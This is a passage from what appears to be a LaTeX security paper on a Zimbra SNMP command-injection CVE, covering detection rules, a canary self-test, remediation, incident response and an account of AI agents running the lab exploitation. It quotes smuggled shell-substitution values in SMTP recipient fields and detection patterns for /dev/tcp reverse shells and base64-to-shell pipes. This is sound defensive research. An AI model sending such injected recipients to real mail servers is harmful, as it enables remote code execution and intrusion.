        ParentImage|ParentImageName|image|process: ['*perl*', '*swatchdog*']
    child_img:
        Image|image|process: ['/bin/sh', '/bin/bash', '*/sh']
    cmd_b64:
        CommandLine|argumentsRaw: ['base64', ' -d', '|sh', '|bash']
    cmd_tcp:
        CommandLine|argumentsRaw: ['/dev/tcp/']
    condition: parent and child_img and (2 of cmd_b64 or cmd_tcp)
level: high
\end{lstlisting}

\begin{lstlisting}[style=yargen,caption={Rule: RCPT attempt in mail logs (fires even on patched hosts)}]
title: Postfix Recipient Field Carrying Shell Command Substitution (CVE-2026-73570 Attempt)
logsource: {product: linux, service: postfix}
detection:
    selection:
        message|Log|LogRaw: ['to=<$("', 'to=<$((']
    condition: selection
level: high
\end{lstlisting}

\textbf{Live-fire evidence.} Every rule was validated against events captured
during our own exploitation (full transcripts in
evidence/rule-fires/sigma-fires.md). The definitive process capture — a
visible \texttt{sleep 45} payload injected through the sink, observed alive:
\begin{lstlisting}[style=shell,caption={Live process tree during injection (2026-08-24 08:42 UTC)}]
#  PARENT (the monitor)
zimbra  2616  2604  /usr/bin/perl /opt/zimbra/data/tmp/.swatchdog_script.2604
#  SINK FIRES (rule swatch_dosnmp_cmd_injection: sh child of perl)
zimbra  172641  2616  sh -c /opt/zimbra/common/bin/snmptrap -v 2c -c zimbra \
    172.30.0.1 '' ZIMBRA-TRAP-MIB::zmServiceStatusTrap \
    ZIMBRA-MIB::zmServiceName s "zzz$(sleep 45)@mail.zmdemo2.lab" \
    ZIMBRA-MIB::zmServiceStatus i 1
#  INJECTED COMMAND, ALIVE, AS ZIMBRA (rule zimbra_dev_tcp_reverse_shell family)
zimbra  172642  172641  sleep 45
\end{lstlisting}
The \texttt{to=<\$(} attempt rule matched the real MTA log line
\texttt{to=<"cve73570canary\$(touch\${IFS}/\hspace{0pt}tmp/cve-73570-canary)"@\hspace{0pt}mail.zmdemo2.lab>,
relay=none, ..., status=bounced}; the logo-tamper rule matched the recorded
defacement command line (post-swap banner md5
\texttt{2ae279fe...}$\rightarrow$\texttt{2ef75996...}).

\subsection{YARA (3 rules)}

\begin{lstlisting}[style=yar,caption={YARA: envelope recipient with command substitution (mail-queue scan)}]
rule cve2026_73570_mailqueue_rcpt_injection {
    meta:
        cve = "CVE-2026-73570"
        severity = "high"
        attack = "T1190, T1059.004"
    strings:
        $rcpt_cmdsub = /to[=:]\s*"?\s*<[^>]*\$\(/ ascii
        $log_rcpt   = /to=<[^>]*\$\(/ ascii
        $b64_pipe   = "base64" ascii
    condition:
        filesize < 2mb and
        ( ($rcpt_cmdsub or $log_rcpt) and (any of them or $b64_pipe) )
}
\end{lstlisting}

The companion rules scan \texttt{zmswatch.out} for the sink's execution
marker \emph{plus} shell syntax (the proof the sink fired), and identify the
PoC defacement banner (to verify your own tests / IR containment).

\textbf{Live-fire evidence.} Scanning the lab's real post-exploitation artifacts
(YARA 4.5.8): the 166\,MB \texttt{/var/log/zimbra.log} matched
\texttt{cve2026\_73570\_mailqueue\_rcpt\_injection};
\texttt{zmswatch.out} (the sink's own stdout) matched both the rcpt rule and
\texttt{cve2026\_73570\_swatch\_snmp\_notify\_artifact} (the
\texttt{SNMP notification:} marker plus shell syntax in one record); the PoC
defacement asset matched its fingerprint rule while the \emph{stock} banner
did not (negative control). Transcript in evidence/rule-fires/yara-fires.txt.

\subsection{Suricata (3 signatures)}

\begin{lstlisting}[style=shell,caption={Suricata: SMTP attempt on the wire (sids 20267357/20267358)}]
alert tcp $EXTERNAL_NET any -> $HOME_NET 25 (
    msg:"CVE-2026-73570 SMTP RCPT with shell command substitution (zimbra-snmp sink attempt)";
    flow:to_server; content:"RCPT TO:"; nocase;
    content:"$("; distance:0; within:120;
    sid:20267357; rev:1;
)
\end{lstlisting}

The third signature alerts on high-port egress from the mail server itself
(sid 20267359) — the reverse-shell beacon — a control that works even if the
SMTP attempt slips past a gateway.

\textbf{Live-fire evidence.} The recorded wire shape
\texttt{RCPT TO: <"cve73570canary\$(...)@mail.zmdemo2.lab">} satisfies the
\texttt{content:"RCPT TO:"; content:"\$("; within:120} sequence
byte-for-byte (validation in evidence/rule-fires/sigma-fires.md). In
production, place the rule in front of the MTA (or at the SMTP gateway) so
attempts are caught before the log hop.

\subsection{EDR platform mapping}

Zimbra hosts rarely run agent EDR; where they do, the two high-fidelity
Sigma rules map directly:

\begin{table*}[t]
\centering
\footnotesize
\begin{tabular}{p{4.2cm}p{7.2cm}p{4.2cm}}
\toprule
 & Microsoft Defender for Linux (KQL) & CrowdStrike Falcon (query) \\
\midrule
Sink firing &
  \texttt{DeviceProcessEvents | where ProcessCreationTime > ago(1d) | where
  Process=="/bin/sh" or Process=="/bin/bash" | where ParentImageFileName
  contains "perl" | where ProcessCommandLine contains "base64" or
  ProcessCommandLine contains "/dev/tcp/"} &
  Process tree: parent image matches \texttt{perl\%}, child
  \texttt{/bin/sh}, \texttt{processcmdline} contains \texttt{base64}
  or \texttt{/dev/tcp/} \\
Zimbra shell &
  \texttt{DeviceProcessEvents | where UserName == "zimbra" | where
  ProcessCommandLine contains "/dev/tcp/"} &
  \texttt{user} is \texttt{zimbra}, cmdline contains \texttt{/dev/tcp/} \\
\bottomrule
\end{tabular}
\caption{Paste-ready queries for the two high-fidelity detections.}
\label{tab:edr}
\end{table*}

\subsection{Non-invasive self-test: the canary detector}

\texttt{detection/detect\_snmp\_sink.py} gives defenders a way to
\emph{verify their own posture} without exploitation:
\begin{itemize}
\item \texttt{--audit} (zero packets, zero changes): version check against
      the 10.1.20 threshold, \texttt{swatchrc} sink presence,
      \texttt{snmp\_notify} setting, \texttt{swatchdog} liveness. Verdict:
      VULNERABLE / NOT VULNERABLE / UNKNOWN.
\item \texttt{--active} (one crafted email, canary only): sends the
      \texttt{touch}-only payload, polls the canary with a verifier command
      the defender supplies (local \texttt{test}, \texttt{docker exec},
      SSH), and reports \texttt{SINK EXECUTES} vs \texttt{SINK DID NOT
      FIRE} with the discriminating preconditions spelled out.
\end{itemize}

\begin{lstlisting}[style=shell,caption={Detector output on the stock lab (real run)}]
$ python3 detect_snmp_sink.py --audit            # on the Zimbra host
VERDICT: VULNERABLE (version + sink present)

$ python3 detect_snmp_sink.py --active 172.30.0.20 \
    --verify-cmd "docker exec zmdemo-snmp test -f /tmp/cve-73570-canary"
VERDICT: SINK EXECUTES: the swatch/dosnmp sink ran the injected command
(canary created). System is vulnerable - remediate.
\end{lstlisting}

Recommended operational cadence: \texttt{--audit} in the quarterly config
audit; \texttt{--active} (authorized scope only) after any Zimbra patch
cycle to close the loop; both feed the 30-day post-incident re-check in
\texttt{playbook-ir.md}.

% =============================================================================
\section{Remediation and Incident Response}
\label{sec:remediation}

\textbf{Primary fix: upgrade to ZCS 10.1.20} (2026-07-20). The one-function
rewrite (Section~\ref{sec:vuln}) moves the attacker-controlled value across
the \texttt{execve} boundary; our A/B lab result
(Section~\ref{sec:fix}) confirms the sink goes inert while the positive
control still fires. Because CISA KEV lists the CVE with a 2026-08-24
federal deadline and CERT Polska documents active exploitation, we treat
``upgrade + deploy detections'' as the minimum bar for any internet-adjacent
ZCS deployment.

\textbf{Interim mitigations} (if the upgrade is delayed), in preference
order: (1) \texttt{zmlocalconfig -e snmp\_notify=0} + SNMP service restart
(disarms the trigger), (2) stop \texttt{zimbra-snmp} entirely if SNMP
monitoring is unused, (3) remove the mail-driven \texttt{watchfor} block from
\texttt{swatchrc.in}/\texttt{swatchrc}, (4) tighten the SMTP attack path
(\texttt{mynetworks} to localhost, mandatory authenticated submission).
None of these replaces the upgrade; they shrink the window. Full command
detail: \texttt{remediation.md}.

\textbf{Incident response.} \texttt{playbook-ir.md} provides a four-phase
playbook validated against the lab artifacts: (Phase 0) read-only triage —
grep \texttt{zmswatch.out} for \texttt{SNMP notification:} lines with shell
syntax, grep the mail logs for \texttt{to=<\$(,} capture the live process
tree (the \texttt{ps} shape of Listing in Section~\ref{sec:detection}),
md5-compare the login banners against baseline, hunt zimbra-owned recent
files and cron/SSH persistence; (Phase 1) containment — kill the captured
chain, disable \texttt{snmp\_notify}, block attacker egress, preserve a
hashed evidence tarball before eradication; (Phase 2) eradication — restore
stock web assets from a clean build, purge the poisoned queue entries,
rebuild if residue is unexplainable; (Phase 3) recovery — patch first,
re-verify with the canary detector, keep the detection package deployed,
30-day enhanced monitoring.

\textbf{The defender's recurring question} — ``how do I know I'm not
already hit?'' — has a concrete answer now: run the passive
\texttt{--audit} today, review mail logs for the \texttt{to=<\$(} pattern
over the last 90 days (our YARA rule does this at 166\,MB scale), compare
banner hashes, and check for the process shape of
Section~\ref{sec:detection} in EDR history.

% =============================================================================
\section{Ethical Considerations, Reproducibility, and the Agent Pipeline}
\label{sec:ethics}

\textbf{Responsible disclosure.} CVE-2026-73570 is a publicly disclosed
vulnerability (vendor advisory 2026-06-26; CERT Polska 145/2026; CISA KEV
2026-08-21). We make no discovery claim; this work is independent lab
verification, empirical trigger identification, and defender tooling. All
exploitation was performed exclusively inside the isolated, zero-egress
Docker lab of Section~\ref{sec:lab} against a fictional internal domain
(\texttt{mail.zmdemo2.lab}); no third-party system was touched. Payloads
followed minimum-impact discipline: canary-first (a file timestamp is the
only effect of the proof payload), one defaced asset per service with
backups and documented restoration, and full lab restore verified by hash
after every experiment.

\textbf{AI agents in the pipeline.} This research and its lab environment
were built and operated with AI agents in a controlled environment.
Beyond that note, we are specific about what the agent did, because the
distinction matters: the agent executed the full operational pipeline —
recon, trigger-matrix testing, dry-run/kill-shot sequencing, process and
log forensics, defacement and its verification, lab restoration — under a
hard think-then-act barrier, with every decision logged to the beat log
that drives Figure~\ref{fig:agent}. A human supervised scope, approved the
kill-shot, and verified each on-camera claim frame-by-frame.

This gives an empirical data point for the LLM-pentesting literature.
CHECKMATE~\cite{wang2025checkmate} identifies incoherent long-horizon
planning as the dominant LLM-agent failure mode and proposes an external
classical planner. Our 7-stage beat log (RECON$\rightarrow$\dots$\rightarrow$
FLAG, 51 timed beats in the cinematic run, zero stage regressions, zero
re-plans mid-exploit) is a real-vulnerability instance where the coherence
problem did not surface — consistent with the argument that
\emph{structural} barriers (think/act separation, an explicit stage
artifact, verifiable done-criteria per stage) substitute for, or complement,
an external planner. We report this as an n=1 case study, not evidence of
general agent capability; the beat log is released so others can check it.

\textbf{Reproducibility.} The companion folder
\texttt{Research/CVE-2026-73570/} is self-contained: \texttt{lab/}
rebuilds the target in one script (image build $\approx$15--25\,min with
provisioning egress; runtime stays 0-egress); \texttt{exploit/} and
\texttt{detection/} are stdlib-only Python; \texttt{rules/} imports
directly into Sigma-compatible SIEMs, YARA 4.x, and Suricata;
\texttt{ioc/}, \texttt{remediation.md}, and \texttt{playbook-ir.md} carry
the defensive artifacts; \texttt{evidence/} (with SHA-256 manifests) holds
every figure's source frame and the live-fire transcripts cited in this
paper; \texttt{videos/} holds the two approved recordings. A defender can
go from clone to ``my detections catch this attack'' in under an hour.

% =============================================================================
\section{Conclusion}
\label{sec:conclusion}

CVE-2026-73570 is a textbook trust-chain break: an MTA that logs attacker
text, a monitor that captures it, and a sink that executes it — three
subsystems each doing something reasonable, together doing something
lethal. The public record named the sink; this paper supplies the middle
and the back end: the empirically identified recipient-field trigger path
with its wire constraints, negative-control proof of execution, live
process-tree evidence, a fix verified by A/B lab comparison, and a
defender package (5 Sigma / 3 YARA / 3 Suricata + EDR mappings + canary
self-test + IR playbook) in which every detection was shown firing against
the real attack. The same pipeline was operated end-to-end by autonomous AI
agents under a logged think-then-act discipline — a case study in
long-horizon attack coherence that we release in full, evidence included,
because the defenders who need it most are the ones who can least afford
to trust vendor summaries alone.

% =============================================================================
\begin{thebibliography}{99}

\bibitem{wang2025checkmate}
L.~Wang, X.~Shi, Z.~Li, Y.~Jiang, S.~Tan, Y.~Jiang, J.~Cheng, W.~Chen,
X.~Shen, Z.~Li, and Y.~Chen, ``Automated Penetration Testing with LLM Agents
and Classical Planning,'' \emph{arXiv:2512.11143 [cs.CR]}, 2025.

\bibitem{nvd73570}
NIST NVD, ``CVE-2026-73570: Command injection in the SNMP monitoring
component of Zimbra Collaboration Suite before 10.1.20,''
\url{https://nvd.nist.gov/vuln/detail/CVE-2026-73570}.

\bibitem{zimbraadvisory}
Zimbra, ``Zimbra Security Advisories — command injection in SNMP
monitoring component (advisory 2026-06-26; fixed in 10.1.20, 2026-07-20),''
\url{https://wiki.zimbra.com/wiki/Zimbra_Security_Advisories}.

\bibitem{certpolska}
CERT Polska, ``Advisory 145/2026: actively exploited vulnerability in
Zimbra Collaboration Suite,'' 2026-08-17,
\url{https://moje.cert.pl/komunikaty/2026/145/}.

\bibitem{ciskev}
CISA, ``Known Exploited Vulnerabilities Catalog — CVE-2026-73570
(added 2026-08-21, FCEB due 2026-08-24),''
\url{https://www.cisa.gov/known-exploited-vulnerabilities-catalog}.

\bibitem{zmcommit}
Zimbra, ``zm-build commit c4837c66 —
doSNMP: backtick command to multi-arg system(),''
\href{https://github.com/Zimbra/zm-build/commit/c4837c66360979d757890271f6c976727e71bcad}{\texttt{https://github.com/Zimbra/zm-build/commit/\hspace{0pt}c4837c663609\hspace{0pt}79d757890271\hspace{0pt}f6c976727e71bcad}}.

\bibitem{zimbraadminguide}
Zimbra, ``Admin Guide — SNMP Monitoring,''
\url{https://github.com/Zimbra/adminguide/blob/develop/monitoring.adoc}.

\bibitem{sigma}
SigmaHQ, ``Sigma — generic signature framework for SIEM event logs,''
\url{https://github.com/SigmaHQ/sigma}.

\bibitem{yara}
VirusTotal, ``YARA — the powerful rule-based matching tool,''
\url{https://github.com/VirusTotal/yara}.

\bibitem{suricata}
OISF, ``Suricata — network IDS/IPS/NSM engine,''
\url{https://suricata.io/}.

\end{thebibliography}

\end{document}
